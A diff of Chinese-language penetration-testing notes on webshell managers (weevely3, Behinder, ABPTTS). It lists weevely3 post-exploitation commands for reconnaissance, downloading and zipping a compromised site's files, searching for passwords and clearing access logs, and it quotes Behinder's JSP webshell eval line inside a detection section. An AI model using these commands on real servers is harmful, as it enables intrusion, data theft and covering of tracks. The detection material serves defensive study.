@@ -1,40 +1,16 @@
-### Webshell管理与后渗透工具
+### Webshell管理工具
 
-|名称|管理端的编程语言|针对目标环境|描述|
+
+|webshell名称|主控端语言|针对目标环境|描述|
 |:-------------:|--|--|-----|
-|[epinna/weevely3](https://github.com/epinna/weevely3)|python|php|文件管理/HTTP(S) proxy/Bruteforce SQL accounts/Port scan|
+|[epinna/weevely3](https://github.com/epinna/weevely3)|python2|php | 更适合linux环境下的后渗透 |
 |[rebeyond/Behinder](https://github.com/rebeyond/Behinder)|Java|php/Java/.NET|“冰蝎” 动态二进制加密 webshell管理端|
 |[ABPTTS](https://github.com/nccgroup/ABPTTS)|python|.jsp .war .aspx|TCP tunneling over HTTP/HTTPS for web application servers. 参考[Black Hat USA 2016](https://www.blackhat.com/us-16/arsenal.html#a-black-path-toward-the-sun) |
 
-### 通过堆栈检测未知webshell(可发现冰蝎webshell)
-
-冰蝎webshell的JSP版本通过自定义ClassLoader + defineClass方法来实现eval特性。
-```
-new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
-```
-
-因为冰蝎webshell使用了加密通信流量(AES双向加密)，可绕过WAF/IDS等系统
-
-检测方法:部署在web应用内部的OpenRASP能够看到后门操作日志（需安装 999-event-logger 插件）:
-```
-[event-logger] Listing directory content: /
-[event-logger] Execute command: whoami
-```
-
-同样，可通过"命令执行"的堆栈进行检测:
-```
-java.lang.ProcessBuilder.start
-...
-net.rebeyond.behinder.payload.java.Cmd.RunCMD
-net.rebeyond.behinder.payload.java.Cmd.equals
-```
-
-检测方法参考自[百度安全实验室](https://mp.weixin.qq.com/s?src=11&timestamp=1562667020&ver=1718&signature=d-uJaXrL7n3rxgaAIbCwhNwsmR30j*WEc-6KntSfDK53VoJSUODDlwvvxEiF3Y5oN*8PnkZChi5DtxhyhtULFDryXwj927jCv1H2KWYADcTU-VHxlZas6QlTRVxkSkoP&new=1)
 
 
-#### 后渗透功能
+#### weevely3的后渗透功能总结
 
-weevely的后渗透功能：
 * 主机信息搜集(详细内容参考其他笔记)
   * 工具命令`system_info` 查看当前webshell文件位置 操作系统类型 根目录 php版本 当前用户名 外网IP 等
   * 工具命令`system_procs` 列出进程
@@ -47,7 +23,8 @@ weevely的后渗透功能：
   * 下载文件命令`:file_download result.zip /Users/xxx/Downloads/result.zip` 把目标站的`result.zip` 下载到本地`Downloads/result.zip`
   * 上传文件命令`:file_upload /Users/xxx/Downloads/1.png file.png -force -vector fwrite`把本地文件/数据 上传到 远程目标站`file.png` 参数`-force`表示如果文件存在则强制覆盖
   * 上传文件命令`:file_upload -content "testdata" data.php` 把本地文件/数据 上传到 远程目标站`data.php`
-  * 压缩文件命令`:file_zip site.zip ./` 把当前目录下所有文件压缩成site.zip
+  * 压缩文件命令`:file_zip site.zip ./` 把当前目录下所有文件压缩成site.zip 注意压缩过程可能被中断(判断方法是临时压缩文件大小不变) 建议重新执行压缩文件命令(实测某次压缩过程被中断6次才压缩成功 最终压缩包大小为2G)
+  * 压缩文件命令`:file_gzip site.gz ./` 只支持linux
   * 搜索内容命令`:file_grep ./ "pass"` 不建议搜索大目录
 * net网络请求
   * 端口扫描
@@ -87,3 +64,28 @@ weevely的后渗透功能：
     * 使用php代码实现`:file_clearlog -vector php_clear 1.1.1.1 access.log`
     * 使用sed命令实现`:file_clearlog -vector clearlog 1.1.1.1 access.log`
     * 使用sed命令实现`:file_clearlog -vector old_school 1.1.1.1 access.log`
+
+### 检测案例1 - 通过堆栈检测未知webshell(可发现冰蝎webshell)
+
+冰蝎webshell的JSP版本通过自定义ClassLoader + defineClass方法来实现eval特性。
+```
+new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
+```
+
+因为冰蝎webshell使用了加密通信流量(AES双向加密)，可绕过WAF/IDS等系统
+
+检测方法:部署在web应用内部的OpenRASP能够看到后门操作日志（需安装 999-event-logger 插件）:
+```
+[event-logger] Listing directory content: /
+[event-logger] Execute command: whoami
+```
+
+同样，可通过"命令执行"的堆栈进行检测:
+```
+java.lang.ProcessBuilder.start
+...
+net.rebeyond.behinder.payload.java.Cmd.RunCMD
+net.rebeyond.behinder.payload.java.Cmd.equals
+```
+
+检测方法参考自[百度安全实验室](https://mp.weixin.qq.com/s?src=11&timestamp=1562667020&ver=1718&signature=d-uJaXrL7n3rxgaAIbCwhNwsmR30j*WEc-6KntSfDK53VoJSUODDlwvvxEiF3Y5oN*8PnkZChi5DtxhyhtULFDryXwj927jCv1H2KWYADcTU-VHxlZas6QlTRVxkSkoP&new=1)
